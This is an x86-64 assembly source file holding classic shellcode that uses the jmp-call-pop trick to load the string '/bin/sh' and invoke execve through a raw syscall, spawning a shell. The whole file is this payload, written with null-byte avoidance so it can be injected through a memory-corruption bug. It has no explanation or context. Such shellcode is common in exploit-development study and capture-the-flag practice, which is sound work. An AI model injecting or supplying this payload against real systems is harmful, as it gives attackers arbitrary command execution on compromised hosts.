[global _start]
  
_start:
  jmp ed

st:
  ; execve(const char *filename, const char * const argv[], const char * const envp[])
  pop rdi
  xor rax, rax
  add al, 59
  xor rsi, rsi
  xor rdx, rdx
  syscall
  ret

ed:
  call st
  db "/bin/sh", 0
